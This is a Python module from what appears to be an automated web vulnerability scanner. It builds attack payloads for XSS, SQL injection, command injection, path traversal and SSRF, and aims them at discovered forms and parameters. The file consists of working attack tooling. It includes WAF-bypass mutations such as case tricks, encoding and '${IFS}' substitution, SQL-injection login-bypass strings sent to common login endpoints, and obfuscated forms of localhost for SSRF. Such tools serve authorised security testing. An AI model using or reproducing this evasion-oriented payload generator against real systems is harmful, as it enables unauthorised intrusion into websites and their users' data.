"""
Payload Generation Module

Generates context-aware payloads using AI + known payload database.
Includes WAF bypass mutations and encoding tricks.
"""
import json
import random
from urllib.parse import quote, quote_plus

from app.ai.llm_engine import LLMEngine


def _mutate_for_waf(payload: str, vuln_type: str) -> list[str]:
    """Generate WAF bypass mutations of a payload.
    Returns 2-4 mutated variants that may bypass common WAFs."""
    mutations = []

    if vuln_type in ("xss", "xss_reflected", "xss_stored"):
        # Case variation
        mutations.append(payload.replace("script", "ScRiPt").replace("alert", "aLeRt"))
        # Double URL encoding
        mutations.append(quote(payload, safe=""))
        # HTML entity encoding for event handlers
        mutations.append(payload.replace("onerror", "&#111;nerror").replace("onload", "&#111;nload"))
        # Null bytes in tags
        mutations.append(payload.replace("<", "<%00").replace(">", "%00>"))

    elif vuln_type in ("sqli", "sqli_blind"):
        # Comment as space bypass
        mutations.append(payload.replace(" ", "/**/"))
        # Tab/newline as space
        mutations.append(payload.replace(" ", "%09"))
        mutations.append(payload.replace(" ", "%0a"))
        # MySQL version comment
        if "OR" in payload.upper():
            mutations.append(payload.replace("OR", "/*!50000OR*/").replace("or", "/*!50000OR*/"))
        # Case variation
        mutations.append(payload.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN")
                        .replace("select", "SeLeCt").replace("union", "UnIoN"))

    elif vuln_type in ("cmd_injection", "rce"):
        # $IFS bypass (replaces space)
        mutations.append(payload.replace(" ", "${IFS}"))
        # Quote bypass
        mutations.append(payload.replace(" ", "$IFS$9"))
        # Concatenation bypass
        if "id" in payload:
            mutations.append(payload.replace("id", "'i''d'"))
            mutations.append(payload.replace("id", "i\\d"))

    elif vuln_type in ("lfi", "path_traversal"):
        # Double URL encoding
        mutations.append(payload.replace("../", "%252e%252e%252f"))
        # UTF-8 overlong encoding
        mutations.append(payload.replace("../", "..%c0%af"))
        # Dot-dot-slash variations
        mutations.append(payload.replace("../", "....//"))

    elif vuln_type == "ssrf":
        # Decimal IP for 127.0.0.1
        mutations.append(payload.replace("127.0.0.1", "2130706433"))
        # Hex IP
        mutations.append(payload.replace("127.0.0.1", "0x7f000001"))
        # IPv6
        mutations.append(payload.replace("127.0.0.1", "[::ffff:127.0.0.1]"))

    # Filter empty/identical and return unique
    return [m for m in mutations if m and m != payload][:4]


VULN_TYPE_ALIASES = {
    "xss": "xss", "cross-site scripting": "xss", "reflected xss": "xss",
    "sqli": "sqli", "sql injection": "sqli", "sql": "sqli",
    "ssrf": "ssrf", "server-side request forgery": "ssrf",
    "ssti": "ssti", "server-side template injection": "ssti", "template injection": "ssti",
    "rce": "cmd_injection", "remote code execution": "cmd_injection", "command injection": "cmd_injection",
    "cmd_injection": "cmd_injection",
    "lfi": "lfi", "local file inclusion": "lfi", "path traversal": "lfi",
    "idor": "idor", "insecure direct object reference": "idor",
    "open_redirect": "open_redirect", "open redirect": "open_redirect",
    "cors": "cors_misconfiguration", "cors misconfiguration": "cors_misconfiguration",
}

CORE_VULN_TYPES = ["xss", "sqli", "cmd_injection", "ssrf", "ssti", "lfi"]


class PayloadGenerator:
    def __init__(self):
        self.llm = LLMEngine()

    def _normalize_vuln_types(self, raw_types: list[str]) -> list[str]:
        """Normalize AI-returned vuln type names to standard internal names."""
        normalized = []
        for vt in raw_types:
            vt_lower = vt.lower().strip()
            mapped = VULN_TYPE_ALIASES.get(vt_lower)
            if mapped:
                normalized.append(mapped)
            else:
                # Try partial match
                for alias, norm in VULN_TYPE_ALIASES.items():
                    if alias in vt_lower or vt_lower in alias:
                        normalized.append(norm)
                        break
        # Deduplicate preserving order
        seen = set()
        unique = []
        for v in normalized:
            if v not in seen:
                seen.add(v)
                unique.append(v)
        return unique

    async def generate(self, context: dict, db=None) -> list[dict]:
        """Generate payloads based on scan context."""
        payloads = []
        scan_results = context.get("scan_results", [])
        ai_strategy = context.get("ai_strategy", {})
        endpoints = context.get("endpoints", [])
        technologies = context.get("technologies", {})

        # RAG: Pre-load effective payloads from knowledge base
        self._kb_payloads: dict[str, list[str]] = {}
        if db:
            try:
                from app.core.knowledge import KnowledgeBase
                kb = KnowledgeBase()
                tech_list = list((technologies or {}).get("summary", {}).keys())
                tech = tech_list[0].lower() if tech_list else None
                for vt in (ai_strategy or {}).get("priority_vulns", CORE_VULN_TYPES):
                    vt_norm = VULN_TYPE_ALIASES.get(vt.lower().strip(), vt)
                    effective = await kb.get_effective_payloads(db, vt_norm, technology=tech)
                    if effective:
                        # Flatten payloads: use the full list when available (from PATT etc.)
                        all_p = []
                        for p in effective:
                            if p.get("payloads"):
                                all_p.extend(p["payloads"][:30])
                            elif p.get("payload"):
                                all_p.append(p["payload"])
                        self._kb_payloads[vt_norm] = all_p[:50]
            except Exception:
                pass

        # Determine which vuln types to target
        raw_priority = (ai_strategy or {}).get("priority_vulns", CORE_VULN_TYPES)
        priority_vulns = self._normalize_vuln_types(raw_priority)

        # Always include core vuln types
        for core in CORE_VULN_TYPES:
            if core not in priority_vulns:
                priority_vulns.append(core)

        waf_info = context.get("waf_info") or {}
        tech_summary = (technologies or {}).get("summary", {})

        tech_context = {
            "technology": json.dumps(tech_summary),
            "waf": waf_info.get("waf_name", "none"),
            "param_type": "string",
            "injection_point": "parameter",
        }

        # Generate LLM payloads for all vuln types in parallel
        import asyncio

        async def _gen_for_type(vt):
            try:
                return vt, await self.llm.generate_payloads(vt, tech_context)
            except Exception:
                return vt, self.llm._fallback_payloads(vt)

        llm_results = await asyncio.gather(*[_gen_for_type(vt) for vt in priority_vulns])

        has_waf = bool((context.get("waf_info") or {}).get("detected"))

        for vuln_type, raw_payloads in llm_results:
            # Ensure reliable fallback payloads come FIRST (AI may generate wrong types)
            fallback = self.llm._fallback_payloads(vuln_type)
            seen_payloads = set()
            merged = []
            # RAG: Add knowledge base effective payloads FIRST (proven to work)
            for kp in self._kb_payloads.get(vuln_type, []):
                if kp not in seen_payloads:
                    merged.append(kp)
                    seen_payloads.add(kp)
            # Add fallback payloads (they have matching detectors)
            for fp in fallback[:8]:
                if fp not in seen_payloads:
                    merged.append(fp)
                    seen_payloads.add(fp)
            # Then add AI-generated ones
            for rp in raw_payloads:
                if rp not in seen_payloads:
                    merged.append(rp)
                    seen_payloads.add(rp)

            # WAF bypass: generate mutations for top payloads
            if has_waf:
                waf_mutations = []
                for p in merged[:6]:
                    for m in _mutate_for_waf(p, vuln_type):
                        if m not in seen_payloads:
                            waf_mutations.append(m)
                            seen_payloads.add(m)
                merged.extend(waf_mutations)

            raw_payloads = merged

            # Match payloads with endpoints — split budget between forms and GET params
            target_endpoints = self._get_endpoints_for_vuln(vuln_type, endpoints)
            form_eps = [e for e in target_endpoints if e.get("type") == "form"]
            get_eps = [e for e in target_endpoints if e.get("type") != "form"]

            # Deduplicate forms by URL, skip login/logout forms
            seen_form_urls = set()
            unique_forms = []
            login_keywords = ("login", "logout", "signin", "signup", "register")
            for fe in form_eps:
                url_lower = fe["url"].lower()
                # Skip login forms — they're for auth, not vuln testing
                if any(kw in url_lower for kw in login_keywords):
                    continue
                if fe["url"] not in seen_form_urls:
                    seen_form_urls.add(fe["url"])
                    unique_forms.append(fe)

            # Use up to 5 form endpoints + up to 10 GET endpoints
            selected = unique_forms[:5] + get_eps[:10]

            for endpoint in selected:
                for payload in raw_payloads[:15]:
                    if endpoint.get("type") == "form":
                        payloads.extend(
                            self._generate_form_payloads(endpoint, payload, vuln_type)
                        )
                    else:
                        payloads.append({
                            "vuln_type": vuln_type,
                            "payload": payload,
                            "target_url": endpoint.get("url"),
                            "params": endpoint.get("params", []),
                            "method": "GET",
                        })

        # Add POST-based SQLi payloads for login/auth endpoints
        if "sqli" in priority_vulns:
            payloads.extend(self._generate_post_sqli(endpoints, context.get("base_url", "")))

        return payloads

    def _generate_form_payloads(self, endpoint: dict, payload: str, vuln_type: str) -> list[dict]:
        """Generate POST payloads for HTML form endpoints."""
        results = []
        fields = endpoint.get("fields", [])
        hidden_fields = endpoint.get("hidden_fields", {})
        method = endpoint.get("method", "POST")
        url = endpoint.get("url", "")

        for field in fields:
            # Build POST body: inject payload into one field, fill others with benign values
            post_body = dict(hidden_fields)  # include CSRF tokens etc.
            for f in fields:
                if f == field:
                    post_body[f] = "PAYLOAD"
                else:
                    post_body[f] = "test"  # benign value

            result_entry = {
                "vuln_type": vuln_type,
                "payload": payload,
                "target_url": url,
                "method": method,
                "post_field": field,
                "source_page": endpoint.get("source_page", ""),
            }
            if method == "GET":
                # GET forms: inject via query params
                result_entry["params"] = [field]
                result_entry["post_body"] = None
            else:
                # POST forms: inject via request body
                result_entry["params"] = []
                result_entry["post_body"] = post_body
            results.append(result_entry)
        return results

    def _generate_post_sqli(self, endpoints: list[dict], base_url: str) -> list[dict]:
        """Generate POST-based SQLi payloads for login/auth endpoints."""
        post_payloads = []
        sqli_payloads = [
            "' OR 1=1--",
            "' OR '1'='1'--",
            "admin'--",
            "' OR 1=1#",
            "' UNION SELECT NULL--",
        ]

        # Find login/auth endpoints from discovered URLs
        login_endpoints = []
        for e in endpoints:
            url_lower = e.get("url", "").lower()
            if any(p in url_lower for p in ["/login", "/auth", "/signin", "/user/login",
                                             "/rest/user/login", "/api/login", "/session"]):
                login_endpoints.append(e)

        # Also add common login paths if not already found
        common_login_paths = ["/rest/user/login", "/api/login", "/login"]
        for path in common_login_paths:
            full_url = f"{base_url}{path}"
            if not any(e.get("url") == full_url for e in login_endpoints):
                login_endpoints.append({"url": full_url})

        # Common login field names
        login_fields = [
            {"email": "PAYLOAD", "password": "password"},
            {"username": "PAYLOAD", "password": "password"},
            {"user": "PAYLOAD", "pass": "password"},
        ]

        for endpoint in login_endpoints[:5]:
            for sqli in sqli_payloads[:3]:
                for fields in login_fields[:2]:
                    post_payloads.append({
                        "vuln_type": "sqli",
                        "payload": sqli,
                        "target_url": endpoint.get("url"),
                        "params": [],
                        "method": "POST",
                        "post_body": fields,
                    })

        return post_payloads

    def _get_endpoints_for_vuln(self, vuln_type: str, endpoints: list[dict]) -> list[dict]:
        """Select the best endpoints to test for a specific vulnerability type.

        Forms are prioritized since they're more likely to have real injection points.
        """
        if vuln_type in ("xss", "sqli", "ssti", "cmd_injection"):
            matched = [
                e for e in endpoints
                if e.get("params") or e.get("type") in ("parameterized", "api", "injectable", "form")
            ]
            # Prioritize: forms first, then parameterized, then others
            matched.sort(key=lambda e: (0 if e.get("type") == "form" else 1))
            return matched
        elif vuln_type == "ssrf":
            return [
                e for e in endpoints
                if any(p in str(e.get("params", [])).lower()
                       for p in ["url", "link", "redirect", "callback", "proxy", "fetch", "src"])
                or e.get("type") == "injectable"
            ]
        elif vuln_type == "idor":
            return [
                e for e in endpoints
                if any(p in str(e.get("params", [])).lower()
                       for p in ["id", "uid", "user_id", "account", "order"])
                or e.get("type") == "api"
            ]
        elif vuln_type in ("lfi", "path_traversal"):
            return [
                e for e in endpoints
                if any(p in e.get("url", "").lower()
                       for p in ["/ftp", "/file", "/download", "/assets", "/upload", "/static"])
                or any(p in str(e.get("params", [])).lower()
                       for p in ["file", "path", "page", "include", "template", "dir"])
                or e.get("type") in ("upload", "injectable")
            ]
        else:
            return [e for e in endpoints if e.get("interest") in ("high", "critical", "medium")]
